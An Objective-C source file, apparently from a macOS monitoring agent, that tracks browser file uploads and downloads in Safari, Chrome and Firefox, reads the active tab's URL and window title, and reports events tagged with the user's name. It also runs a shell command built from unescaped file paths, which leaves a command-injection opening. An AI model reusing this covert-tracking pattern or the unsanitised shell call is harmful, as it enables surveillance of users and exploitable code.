//
//  InternetFileUploadDownloadCapture.m
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "InternetFileUploadDownloadCapture.h"
#import "FirefoxGetInfo.h"
#import "Firefox.h"
#import "SystemUtilsImpl.h"
#import "DateTimeFormat.h"
#import "FxFileTransferEvent.h"

NSString * const kDUSafariBundleID         = @"com.apple.Safari";
NSString * const kDUFirefoxBundleID        = @"org.mozilla.firefox";
NSString * const kDUGoogleChromeBundleID   = @"com.google.Chrome";

float SafariSleeper = 2.5;
float ChromeSleeper = 1.5;
float firefoxSleeper = 1.5;


#define kSleepDuration  0

@implementation InternetFileUploadDownloadCapture
@synthesize mKeepGoing;
@synthesize mPIDGoogle;
@synthesize mPIDFirefox;
@synthesize mPIDSafari;
@synthesize mCurrentUserName;
@synthesize mFirefoxStart , mChromeStart , mSafariStart;
@synthesize mFirefoxFrontStatus , mChromeFrontStatus , mSafariFrontStatus;
@synthesize mChromeFileUsedCount , mFirefoxFileUsedCount , mSafariFileUsedCount;
@synthesize mDelegate , mSelector , mThread;
@synthesize mFilterSafari, mFilterChrome, mFilterFirefox;
@synthesize mFilterTimeStampSafari, mFilterTimeStampChrome, mFilterTimeStampFirefox;
@synthesize mHistory;

#pragma mark #Start/Stop

-(id)init{
    if (self = [super init]) {
        mDUFirefoxUrlInquirer = [[FirefoxGetInfo alloc] init];
        
        mFilterSafari  = [[NSMutableArray alloc]init];
        mFilterChrome  = [[NSMutableArray alloc]init];
        mFilterFirefox = [[NSMutableArray alloc]init];
        
        mFilterTimeStampSafari  = [[NSMutableArray alloc]init];
        mFilterTimeStampChrome  = [[NSMutableArray alloc]init];
        mFilterTimeStampFirefox = [[NSMutableArray alloc]init];
        mHistory       = [[NSMutableArray alloc]init];
    }
    return self;
}
-(void)startCapture {
    
    [self saveCurrentUser];
   
    self.mKeepGoing = true;
    self.mFirefoxStart = false;
    self.mChromeStart  = false;
    self.mSafariStart  = false;

    self.mSafariFrontStatus  = false;
    self.mChromeFrontStatus  = false;
    self.mFirefoxFrontStatus = false;

    self.mSafariFileUsedCount = 0;
    self.mChromeFileUsedCount = 0;
    self.mFirefoxFileUsedCount = 0;
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(keepPIDWatchList:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(stopWatcher:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(clearPIDWatchList:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
    
    [self setPIDAndStartIfProcessReady];
}

-(void)stopCapture {
    
    self.mKeepGoing    = false;
    self.mSafariStart  = false;
    self.mChromeStart  = false;
    self.mFirefoxStart = false;
    
    self.mSafariFrontStatus  = false;
    self.mChromeFrontStatus  = false;
    self.mFirefoxFrontStatus = false;
    
    self.mSafariFileUsedCount = 0;
    self.mChromeFileUsedCount = 0;
    self.mFirefoxFileUsedCount = 0;
    
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
}

-(void) setPIDAndStartIfProcessReady {
    
    int localPidSafari  = [self getPIDSafari];
    int localPidChrome  = [self getPIDChrome];
    int localPidFirefox = [self getPIDFirefox];
    
    NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
    NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
    [scptFrontmost release];
    
    if (localPidSafari != 0 && [[Result stringValue] isEqualToString:@"Safari"]) {
        self.mPIDSafari = localPidSafari;
        SafariSleeper = 0.2;
        
        self.mSafariStart = true;
        self.mSafariFrontStatus = true;
        
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self startWatchFileUploadwithPID:self.mPIDSafari AppName:@"Safari" AppID:kDUSafariBundleID];
        });
        
    }else if (localPidChrome != 0 && [[Result stringValue] isEqualToString:@"Google Chrome"]) {
        self.mPIDGoogle = localPidChrome;
        ChromeSleeper = 0.2;
        
        self.mChromeStart = true;
        self.mChromeFrontStatus = true;
        
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self startWatchFileUploadwithPID:self.mPIDGoogle AppName:@"Google Chrome" AppID:kDUGoogleChromeBundleID];
        });
        
    }else if (localPidFirefox != 0  && [[Result stringValue] isEqualToString:@"firefox"]) {
        self.mPIDFirefox = localPidFirefox;
        firefoxSleeper = 0.2;
        
        self.mFirefoxStart = true;
        self.mFirefoxFrontStatus = true;
        
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self startWatchFileUploadwithPID:self.mPIDFirefox AppName:@"Firefox" AppID:kDUFirefoxBundleID];
        });
    }
}
#pragma mark #Notification:=>KeepPID

-(void) keepPIDWatchList:(NSNotification *)notification {
    
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * running = [userInfo objectForKey:@"NSWorkspaceApplicationKey"];
    NSString * appBundleIdentifier = [running bundleIdentifier];
    
    if ([appBundleIdentifier isEqualToString:kDUSafariBundleID]) {
        sleep(SafariSleeper);
        SafariSleeper = 0.2;
        
        self.mPIDSafari = [self getPIDSafari];
        if (self.mPIDSafari == 0 ) {
            NSString * applescript = @"delay 0.2 \n tell application \"Safari\" to quit";
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:applescript];
            [scpt executeAndReturnError:nil];
            [scpt release];
            return;
        }
        self.mSafariFrontStatus = true;
        
        if (!self.mSafariStart && self.mKeepGoing) {
            DLog(@"### mSafariStart");
            self.mSafariStart = true;
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                [self startWatchFileUploadwithPID:self.mPIDSafari AppName:@"Safari" AppID:kDUSafariBundleID];
            });
        }
    }
    if ([appBundleIdentifier isEqualToString:kDUGoogleChromeBundleID]){
        sleep(ChromeSleeper);
        ChromeSleeper = 0.2;
        
        self.mPIDGoogle = [self getPIDChrome];
        if (self.mPIDGoogle == 0 ) {
            NSString * applescript = @"delay 0.2 \n tell application \"Google Chrome\" to quit";
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:applescript];
            [scpt executeAndReturnError:nil];
            [scpt release];
            return;
        }
        self.mChromeFrontStatus = true;
        
        if (!self.mChromeStart && self.mKeepGoing) {
            DLog(@"### mChromeStart");
            mChromeStart = true;
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                [self startWatchFileUploadwithPID:self.mPIDGoogle AppName:@"Google Chrome" AppID:kDUGoogleChromeBundleID];
            });
        }
    }
    if ([appBundleIdentifier isEqualToString:kDUFirefoxBundleID]){
        sleep(firefoxSleeper);
        firefoxSleeper = 0.2;

        self.mPIDFirefox = [self getPIDFirefox];
        if (self.mPIDFirefox == 0 ) {
            NSString * applescript = @"delay 0.2 \n tell application \"Firefox\" to quit";
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:applescript];
            [scpt executeAndReturnError:nil];
            [scpt release];
            return;
        }
        self.mFirefoxFrontStatus = true;
        
        if (!self.mFirefoxStart && self.mKeepGoing) {
            DLog(@"### mFirefoxStart");
            mFirefoxStart = true;
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                [self startWatchFileUploadwithPID:self.mPIDFirefox AppName:@"Firefox" AppID:kDUFirefoxBundleID];
            });
        }
    }
}
#pragma mark #Notification:=>stopWatcher

-(void) stopWatcher:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * running = [userInfo objectForKey:@"NSWorkspaceApplicationKey"];
    NSString * appBundleIdentifier = [running bundleIdentifier];
    
    if ([appBundleIdentifier isEqualToString:kDUSafariBundleID]) {
        self.mSafariFrontStatus = false;
        if (self.mSafariFileUsedCount == 0) {
            DLog(@"## stopWatcher mSafariStop");
            self.mSafariStart = false;
        }
    }
    if ([appBundleIdentifier isEqualToString:kDUGoogleChromeBundleID]){
        self.mChromeFrontStatus = false;
        if (self.mChromeFileUsedCount == 0) {
            DLog(@"### stopWatcher mChromeStop");
            self.mChromeStart = false;
        }
    }
    if ([appBundleIdentifier isEqualToString:kDUFirefoxBundleID]){
        self.mFirefoxFrontStatus = false;
        if (self.mFirefoxFileUsedCount == 0) {
            DLog(@"### stopWatcher mFirefoxStop");
            self.mFirefoxStart = false;
        }
    }
}

#pragma mark #Notification:=>ClearPID
-(void) clearPIDWatchList:(NSNotification *)notification {
    DLog(@"clearPIDWatchList");
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    
    if ([appBundleIdentifier isEqualToString:kDUSafariBundleID]) {
        self.mSafariStart = false;
        SafariSleeper = 2.5;
    }
    if ([appBundleIdentifier isEqualToString:kDUGoogleChromeBundleID]){
        self.mChromeStart = false;
        ChromeSleeper = 1.5;
    }
    if ([appBundleIdentifier isEqualToString:kDUFirefoxBundleID]){
        self.mFirefoxStart = false;
        firefoxSleeper = 1.5;
    }
}

#pragma mark #Watch

-(void)startWatchFileUploadwithPID:(int)aPID AppName:(NSString *)aAppName AppID:(NSString *)aAppID {
    
    NSAutoreleasePool * mainPool = [[NSAutoreleasePool alloc]init];
    @try {
    
        NSMutableArray * Direction = [[NSMutableArray alloc]init];
        NSMutableArray * KeepURL = [[NSMutableArray alloc]init];
        NSMutableArray * KeepTitle = [[NSMutableArray alloc]init];
        NSMutableArray * KeepFileName = [[NSMutableArray alloc]init];
        NSMutableArray * KeepFileSize = [[NSMutableArray alloc]init];
        NSMutableArray * KeepINode = [[NSMutableArray alloc]init];
        
        while (1) {
            NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
            
            sleep(kSleepDuration);
            
            if (!self.mKeepGoing) {
                DLog(@"### Break");
                break;
            }
            if (([aAppID isEqualToString:kDUSafariBundleID] && !self.mSafariStart && mSafariFileUsedCount == 0) || aPID ==0 ) {
                DLog(@"### Safari Break");
                break;
            }
            if (([aAppID isEqualToString:kDUGoogleChromeBundleID] && !self.mChromeStart && mChromeFileUsedCount == 0) || aPID ==0 ) {
                DLog(@"### Chrome Break");
                break;
            }
            if (([aAppID isEqualToString:kDUFirefoxBundleID] && !self.mFirefoxStart && mFirefoxFileUsedCount == 0) || aPID ==0 ) {
                DLog(@"### Firefox Break");
                break;
            }

            NSMutableArray * fileOpened = [[NSMutableArray alloc]initWithArray:[self getAllFileIsUsingWithPID:aPID currentUser:self.mCurrentUserName]];
            if ([fileOpened count]>0) {
                NSString * MyURL = [[NSString alloc]init];
                NSString * MyTitle = [[NSString alloc]init];

                if ([aAppID isEqualToString:kDUSafariBundleID]){
                    
                    NSString * applescript = @"delay 0.2 \n tell application \"Safari\" \n return{ URL of current tab of window 1} \n end tell";
                    NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:applescript];
                    NSAppleEventDescriptor *currentURL=[scpt executeAndReturnError:nil];
                    [scpt release];
                    
                    [MyURL release];
                    MyURL = nil;
                    MyURL = [[NSString alloc]initWithString:[currentURL stringValue]];
                    
                    [MyTitle release];
                    MyTitle = nil;
                    MyTitle = [[NSString alloc]initWithString:[SystemUtilsImpl frontApplicationWindowTitle]];

                }else if ([aAppID isEqualToString:kDUGoogleChromeBundleID]){
                    
                    NSString * applescript = @"delay 0.2 \n tell application \"Google Chrome\" to return {URL of active tab of front window}";
                    NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:applescript];
                    NSAppleEventDescriptor *currentURL=[scpt executeAndReturnError:nil];
                    [scpt release];
                    
                    [MyURL release];
                    MyURL = nil;
                    MyURL = [[NSString alloc]initWithString:[currentURL stringValue]];
                    
                    [MyTitle release];
                    MyTitle = nil;
                    MyTitle = [[NSString alloc]initWithString:[SystemUtilsImpl frontApplicationWindowTitle]];

                }else if ([aAppID isEqualToString:kDUFirefoxBundleID]){
                    sleep(0.1);
                    @try {
                        FirefoxApplication *firefoxApp = [SBApplication applicationWithBundleIdentifier:kDUFirefoxBundleID];
                        NSString *title = [[[[firefoxApp windows] get] firstObject] name];
                        [MyURL release];
                        MyURL = nil;
                        MyURL = [[NSString alloc]initWithString:[mDUFirefoxUrlInquirer urlWithTitle:title]];
                        
                    }
                    @catch (NSException *e) {
                        //DLog(@"------>  Firefox url title exception, %@", e);
                    }
                    
                    [MyTitle release];
                    MyTitle = nil;
                    MyTitle = [[NSString alloc]initWithString:[SystemUtilsImpl frontApplicationWindowTitle]];

                }

                NSMutableArray * currentFileOpened = [[NSMutableArray alloc]initWithArray:fileOpened];
                NSMutableArray * currentFileOpenedName = [[NSMutableArray alloc]init];
                NSMutableArray * currentFileOpenedSize = [[NSMutableArray alloc]init];
                
                for (int i = 0; i <[currentFileOpened count]; i++) {
                    NSArray * spliter = [[NSArray alloc]initWithArray:[[currentFileOpened objectAtIndex:i]componentsSeparatedByString:@"<|>"]];
                    NSString * inode  = [[NSString alloc]initWithString:[spliter objectAtIndex:0]];
                    NSString * size   = [[NSString alloc]initWithString:[spliter objectAtIndex:1]];
                    NSString * name   = [[NSString alloc]initWithString:[spliter objectAtIndex:2]];
                    
                    [currentFileOpenedName addObject:name];
                    [currentFileOpenedSize addObject:size];

                    if ( ! [KeepFileName containsObject:name] ) {
                        if ([name rangeOfString:@".com.google.Chrome"].location == NSNotFound){ // For Unwanted Chrome download)
                            NSString * direction;
                            if ( [name rangeOfString:@".crdownload"].location != NSNotFound // For Chrome download
                            ||  [name rangeOfString:@".download/"].location != NSNotFound // For Safari download
                            ||  [name rangeOfString:@".part"].location != NSNotFound // For Firefox download
                            ){
                                direction = [[NSString alloc]initWithString: @"DOWNLOAD"];
                            }else{
                                direction = [[NSString alloc]initWithString: @"UPLOAD"];
                            }
                            
                            if( [MyURL length] > 0 ){
                                DLog(@"###============== Add Data");
                                DLog(@"Add Direction %@",direction);
                                DLog(@"Add URL %@",MyURL );
                                DLog(@"Add KeepFileName %@",name);
                                DLog(@"Add KeepFileName L %d",[name length]);
                                DLog(@"Add KeepINode %@",inode);
                                DLog(@"Add KeepFileSize %@",size);
                                DLog(@"###########################");
                                [Direction addObject:direction];
                                [KeepURL addObject:MyURL];
                                [KeepTitle addObject:MyTitle];
                                [KeepFileName addObject:name];
                                [KeepFileSize addObject:size];
                                [KeepINode addObject:inode];
                            }
                            
                            [direction release];
                        }
                    }
                    [inode release];
                    [size release];
                    [name release];
                    [spliter release];
                }
                
                if ([KeepFileName count] > [currentFileOpenedName count]) {
                    
                    for (int i = 0; i < [KeepFileName count]; i++) {
                        if (![currentFileOpenedName containsObject:[KeepFileName objectAtIndex:i]]) {
                            [self receiveData_Appname:aAppName AppID:aAppID URL:[KeepURL objectAtIndex:i] Filename:[KeepFileName objectAtIndex:i] Filesize:[KeepFileSize objectAtIndex:i] Direction:[Direction objectAtIndex:i] Title:[KeepTitle objectAtIndex:i] INode:[KeepINode objectAtIndex:i]];

                            [KeepURL removeObjectAtIndex:i];
                            [KeepFileName removeObjectAtIndex:i];
                            [KeepFileSize removeObjectAtIndex:i];
                            [KeepTitle removeObjectAtIndex:i];
                            [KeepINode removeObjectAtIndex:i];
                            i--;
                        }
                    }
                }
                
                if ([aAppID isEqualToString:kDUSafariBundleID]){
                    self.mSafariFileUsedCount = (int )[KeepFileName count];
                }else if ([aAppID isEqualToString:kDUGoogleChromeBundleID]){
                    self.mChromeFileUsedCount = (int )[KeepFileName count];
                }else if ([aAppID isEqualToString:kDUFirefoxBundleID]){
                    self.mFirefoxFileUsedCount = (int )[KeepFileName count];
                }
                
                [currentFileOpenedName release];
                [currentFileOpenedSize release];
                [currentFileOpened release];
                [MyTitle release];
                [MyURL release];
            }else{
                
                if ([KeepURL count]>0) {
                    DLog(@"### No opened File Send All");
                    for (int i=0; i < [KeepURL count]; i++) {
                        [self receiveData_Appname:aAppName AppID:aAppID URL:[KeepURL objectAtIndex:i] Filename:[KeepFileName objectAtIndex:i] Filesize:[KeepFileSize objectAtIndex:i] Direction:[Direction objectAtIndex:i] Title:[KeepTitle objectAtIndex:i] INode:[KeepINode objectAtIndex:i]];
                    }
                    [Direction removeAllObjects];
                    [KeepURL removeAllObjects];
                    [KeepTitle removeAllObjects];
                    [KeepFileSize removeAllObjects];
                    [KeepFileName removeAllObjects];
                    [KeepINode removeAllObjects];
                    
                    if ([aAppID isEqualToString:kDUSafariBundleID]){
                        self.mSafariFileUsedCount = 0;
                    }else if ([aAppID isEqualToString:kDUGoogleChromeBundleID]){
                        self.mChromeFileUsedCount = 0;
                    }else if ([aAppID isEqualToString:kDUFirefoxBundleID]){
                        self.mFirefoxFileUsedCount = 0;
                    }
                }
            }

            [fileOpened release];
            [pool drain];
            
            if ( [aAppID isEqualToString:kDUSafariBundleID] && !self.mSafariFrontStatus && mSafariFileUsedCount == 0 ) {
                self.mSafariStart = false;
                DLog(@"### E Safari Stop");
                break;
            }
            if ( [aAppID isEqualToString:kDUGoogleChromeBundleID] && !self.mChromeFrontStatus  && mChromeFileUsedCount == 0 ) {
                self.mChromeStart = false;
                DLog(@"### E Chrome Stop");
                break;
            }
            if ( [aAppID isEqualToString:kDUFirefoxBundleID] && !self.mFirefoxFrontStatus  && mFirefoxFileUsedCount == 0 ) {
                self.mFirefoxStart = false;
                DLog(@"### E Firefox Stop");
                break;
            }
        }
        
        DLog(@"### EndWatchFileUploadwithPID");
        [Direction release];
        [KeepURL release];
        [KeepTitle release];
        [KeepFileName release];
        [KeepFileSize release];
        [KeepINode release];
    }
    @catch (NSException *exception) {
        DLog(@"exception");
    }
    [mainPool drain];
}

#pragma mark #SendData

-(void)receiveData_Appname:(NSString *)aApp AppID:(NSString *)aAppID URL:(NSString *)aUrl Filename:(NSString *)aFilename Filesize:(NSString *)aFilesize Direction:(NSString *)aDirection Title:(NSString *)aTitle INode:(NSString *)aINode{

    NSString * protocol = @"";
    if ([aUrl.lowercaseString hasPrefix:@"https"]) {
        protocol = @"HTTPS";
    }else if ([aUrl.lowercaseString hasPrefix:@"http"]) {
        protocol = @"HTTP";
    }
    if ([aDirection isEqualToString:@"UPLOAD"]) {
        [self readyToSendData_Direction:aDirection currentUser:self.mCurrentUserName Appname:aApp AppID:aAppID Protocol:protocol URL:aUrl Filename:aFilename Filesize:aFilesize Title:aTitle INode:aINode];
    }else if ([aDirection isEqualToString:@"DOWNLOAD"]) {
        sleep(2);
        NSMutableArray * createdFile = [[NSMutableArray alloc]initWithArray:[self findFileRecentlyCreatedByPath:[self getOnlyPath:aFilename]]];
        if ([createdFile count]>0 ) {
            if ([[createdFile objectAtIndex:1] intValue] > 0) {
                [self readyToSendData_Direction:aDirection currentUser:self.mCurrentUserName Appname:aApp AppID:aAppID Protocol:protocol URL:aUrl Filename:[createdFile objectAtIndex:0] Filesize:[createdFile objectAtIndex:1] Title:aTitle INode:aINode];
            }else{
                DLog(@"file Size = 0");
            }
        }else{
            DLog(@"No file Found");
        }
        [createdFile release];
    }
}

-(void)readyToSendData_Direction:(NSString *)aDirection currentUser:(NSString *)aCurrentUser Appname:(NSString *)aApp AppID:(NSString *)aAppID Protocol:(NSString *)aProtocol URL:(NSString *)aURL Filename:(NSString *)aFilename Filesize:(NSString *)aFilesize Title:(NSString *)aTitle INode:(NSString *)aINode{
    DLog(@"=====### readyToSendData ####=====");
    BOOL isDuplicate = false;
    
    if ([aDirection isEqualToString:@"UPLOAD"]) {
        isDuplicate = [self isDuplicateAndInTheLimitTimeOrNot_AppID:aAppID Protocol:aProtocol URL:aURL Filename:aFilename Filesize:aFilesize];
    }
    
    if ([aDirection isEqualToString:@"DOWNLOAD"] || !isDuplicate ) {
        
        NSString * path = [self getOnlyPath:aFilename];
        NSString * fileName = [NSString stringWithFormat:@"%@",[self getOnlyFile:aFilename]];
        
        NSString * keeper = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@|%@|%@|%@|%@|%@|%@",aDirection,aAppID,aProtocol,aURL,path,fileName,aFilesize]];
        
        if (! [mHistory containsObject:keeper]) {
            [mHistory addObject:keeper];

            if ([aFilename rangeOfString:@"file://"].location == NSNotFound && [aURL rangeOfString:@"file://"].location == NSNotFound) {
                if ([fileName rangeOfString:@"\\x"].location != NSNotFound) {
                    NSString * realName = [self runAsCommand:[NSString stringWithFormat:@"ls -i %@ | grep %@ | awk '{out = \"\"; for(i=2;i<=NF;i++){if(i==9){out=out""$i}else{out=out\" \"$i}}; print out};'",path,aINode]];
                    fileName = realName;
                }
                
                DLog(@"Direction :%@",aDirection);
                DLog(@"CurrentUser :%@",aCurrentUser);
                DLog(@"aAppID :%@",aAppID);
                DLog(@"App :%@",aApp);
                DLog(@"Protocol :%@",aProtocol);
                DLog(@"URL :%@",aURL);
                DLog(@"Title :%@",aTitle);
                DLog(@"Path :%@",path);
                DLog(@"FileName :%@",fileName);
                DLog(@"FileSize :%@",aFilesize);
                DLog(@"=========================");
                
                if ([mDelegate respondsToSelector:mSelector] ){
                    FxFileTransferEvent *fileTransferEvent = [[FxFileTransferEvent alloc] init];
                    [fileTransferEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                    [fileTransferEvent setMUserLogonName:aCurrentUser];
                    [fileTransferEvent setMApplicationID:aAppID];
                    [fileTransferEvent setMApplicationName:aApp];
                    [fileTransferEvent setMTitle:aTitle];
                    
                    if ([aProtocol isEqualToString:@"HTTPS"] || [aProtocol isEqualToString:@"HTTP"]) {
                        [fileTransferEvent setMTransferType:kFileTransferTypeHTTP_HTTPS];
                    }else{
                        [fileTransferEvent setMTransferType:kFileTransferTypeUnknown];
                    }
                    
                    if ([aDirection isEqualToString:@"UPLOAD"]) {
                        [fileTransferEvent setMDirection:kEventDirectionOut];
                        [fileTransferEvent setMSourcePath:[NSString stringWithFormat:@"%@/%@",path,fileName]];
                        [fileTransferEvent setMDestinationPath:aURL];
                    }else if ([aDirection isEqualToString:@"DOWNLOAD"]) {
                        [fileTransferEvent setMDirection:kEventDirectionIn];
                        [fileTransferEvent setMSourcePath:aURL];
                        [fileTransferEvent setMDestinationPath:[NSString stringWithFormat:@"%@/%@",path,fileName]];
                    }
                    
                    [fileTransferEvent setMFileName:fileName];
                    [fileTransferEvent setMFileSize:[aFilesize intValue]];
                    [mDelegate performSelector:mSelector onThread:mThread withObject:fileTransferEvent waitUntilDone:NO];
                    [fileTransferEvent release];
                }
            }else{
                DLog(@"####### 1.%@ or 2.%@ come file local file ",fileName,aURL);
            }
        }else{
            DLog(@"Duplicate Donwload Or Upload");
        }
        
        [keeper release];
        
    }else{
        DLog(@"######## %@ %@ Duplicate for sure",aDirection,[self getOnlyFile:aFilename]);
    }
}
#pragma mark #Utility

-(int) isDuplicateAndInTheLimitTimeByConnectionOrNot_AppID:(NSString *)aAppID Protocol:(NSString *)aProtocol URL:(NSString *)aURL Filename:(NSString *)aFilename Filesize:(NSString *)aFilesize {
    int indexToReturn = -1;
    NSString * filterRegex = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@,%@,.*.,%@,%@",aAppID,aProtocol,aFilename,aFilesize]];
    if ([aAppID isEqualToString:kDUSafariBundleID]) {
        for (int i=0; i < [mFilterSafari count]; i++) {
            if ([[self regex:filterRegex withString:[mFilterSafari objectAtIndex:i]] length] > 0) {
                indexToReturn = i;
                break;
            }
        }
    }else if ([aAppID isEqualToString:kDUGoogleChromeBundleID]) {
        for (int i=0; i < [mFilterChrome count]; i++) {
            if ([[self regex:filterRegex withString:[mFilterChrome objectAtIndex:i]] length] > 0) {
                indexToReturn = i;
                break;
            }
        }
    }else if ([aAppID isEqualToString:kDUFirefoxBundleID]) {
        for (int i=0; i < [mFilterFirefox count]; i++) {
            if ([[self regex:filterRegex withString:[mFilterFirefox objectAtIndex:i]] length] > 0) {
                indexToReturn = i;
                break;
            }
        }
    }
    [filterRegex release];
    return indexToReturn;
}

-(BOOL) isDiffTimeMorethanOneHour_OldTime:(NSString *)aOldTime now:(NSString *)aNow replaceTo:(NSMutableArray *)aReplace atIndex:(int)aIndex TotalWait:(int)aLimitTimePerUpload{
    BOOL isDuplicate = false;
    NSDate * oldtime = [self getDateFromString:aOldTime format:@"yyyy-MM-dd HH:mm:ss"];
    NSDate * now = [self getDateFromString:aNow format:@"yyyy-MM-dd HH:mm:ss"];
    int diffTime = [now timeIntervalSince1970] - [oldtime timeIntervalSince1970];
    DLog(@"Chrome diffTime %d : klimitTimePerUpload %d",diffTime,aLimitTimePerUpload);
    if (diffTime >= aLimitTimePerUpload) {
        [aReplace replaceObjectAtIndex:aIndex withObject:aNow];
        isDuplicate = false;
    }else{
        isDuplicate = true;
    }
    return isDuplicate;
}

-(BOOL) isDuplicateAndInTheLimitTimeOrNot_AppID:(NSString *)aAppID Protocol:(NSString *)aProtocol URL:(NSString *)aURL Filename:(NSString *)aFilename Filesize:(NSString *)aFilesize {
    BOOL isDuplicate = false;
    int TotalWait = [self getTimeToClassify:aFilesize];
    NSString * filterString = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%@,%@,%@,%@,%@",aAppID,aProtocol,aURL,aFilename,aFilesize]];
    if ([aAppID isEqualToString:kDUSafariBundleID]) {
        if ([mFilterSafari containsObject:filterString]) {
            int index = -1;
            for (int i=0; i < [mFilterSafari count]; i++) {
                if ([[mFilterSafari objectAtIndex:i]isEqualToString:filterString]) {
                    index = i;
                }
            }
            if (index != -1) {
                isDuplicate = [self isDiffTimeMorethanOneHour_OldTime:[self.mFilterTimeStampSafari objectAtIndex:index] now:[DateTimeFormat phoenixDateTime] replaceTo:self.mFilterTimeStampSafari atIndex:index TotalWait:TotalWait];
            }
        }else{
            int indexDetected = [self isDuplicateAndInTheLimitTimeByConnectionOrNot_AppID:aAppID Protocol:aProtocol URL:aURL Filename:aFilename Filesize:aFilesize];
            DLog(@"indexDetected %d",indexDetected);
            if (indexDetected != -1) {
                isDuplicate = [self isDiffTimeMorethanOneHour_OldTime:[self.mFilterTimeStampSafari objectAtIndex:indexDetected] now:[DateTimeFormat phoenixDateTime] replaceTo:self.mFilterTimeStampSafari atIndex:indexDetected TotalWait:TotalWait];
            }else{
                [self.mFilterSafari addObject:[NSString stringWithFormat:@"%@,%@,%@,%@,%@",aAppID,aProtocol,aURL,aFilename,aFilesize]];
                [self.mFilterTimeStampSafari addObject:[DateTimeFormat phoenixDateTime]];
            }
        }
    }else if ([aAppID isEqualToString:kDUGoogleChromeBundleID]) {
        if ([mFilterChrome containsObject:filterString]) {
            int index = -1;
            for (int i=0; i < [mFilterChrome count]; i++) {
                if ([[mFilterChrome objectAtIndex:i]isEqualToString:filterString]) {
                    index = i;
                }
            }
            if (index != -1) {
                isDuplicate = [self isDiffTimeMorethanOneHour_OldTime:[self.mFilterTimeStampChrome objectAtIndex:index] now:[DateTimeFormat phoenixDateTime] replaceTo:self.mFilterTimeStampChrome atIndex:index TotalWait:TotalWait];
            }
        }else{
            int indexDetected = [self isDuplicateAndInTheLimitTimeByConnectionOrNot_AppID:aAppID Protocol:aProtocol URL:aURL Filename:aFilename Filesize:aFilesize];
            DLog(@"indexDetected %d",indexDetected);
            if (indexDetected != -1) {
                isDuplicate = [self isDiffTimeMorethanOneHour_OldTime:[self.mFilterTimeStampChrome objectAtIndex:indexDetected] now:[DateTimeFormat phoenixDateTime] replaceTo:self.mFilterTimeStampChrome atIndex:indexDetected TotalWait:TotalWait];
            }else{
                [self.mFilterChrome addObject:[NSString stringWithFormat:@"%@,%@,%@,%@,%@",aAppID,aProtocol,aURL,aFilename,aFilesize]];
                [self.mFilterTimeStampChrome addObject:[DateTimeFormat phoenixDateTime]];
            }
        }
    }else if ([aAppID isEqualToString:kDUFirefoxBundleID]) {
        if ([mFilterFirefox containsObject:filterString]) {
            int index = -1;
            for (int i=0; i < [mFilterFirefox count]; i++) {
                if ([[mFilterFirefox objectAtIndex:i]isEqualToString:filterString]) {
                    index = i;
                }
            }
            if (index != -1) {
                isDuplicate = [self isDiffTimeMorethanOneHour_OldTime:[self.mFilterTimeStampFirefox objectAtIndex:index] now:[DateTimeFormat phoenixDateTime] replaceTo:self.mFilterTimeStampFirefox atIndex:index TotalWait:TotalWait];
            }
        }else{
            int indexDetected = [self isDuplicateAndInTheLimitTimeByConnectionOrNot_AppID:aAppID Protocol:aProtocol URL:aURL Filename:aFilename Filesize:aFilesize];
            DLog(@"indexDetected %d",indexDetected);
            if (indexDetected != -1) {
                isDuplicate = [self isDiffTimeMorethanOneHour_OldTime:[self.mFilterTimeStampFirefox objectAtIndex:indexDetected] now:[DateTimeFormat phoenixDateTime] replaceTo:self.mFilterTimeStampFirefox atIndex:indexDetected TotalWait:TotalWait];
            }else{
                [self.mFilterFirefox addObject:[NSString stringWithFormat:@"%@,%@,%@,%@,%@",aAppID,aProtocol,aURL,aFilename,aFilesize]];
                [self.mFilterTimeStampFirefox addObject:[DateTimeFormat phoenixDateTime]];
            }
        }
    }
    [filterString release];
    
    return isDuplicate;
}

-(int)getTimeToClassify:(NSString *)aSize{
    if ([aSize intValue] <= 1000000) {
        return 60 * 1;
    }else{
        return ([aSize intValue] / 1000000) * 0.7 * 60;
    }
    return 0;
}

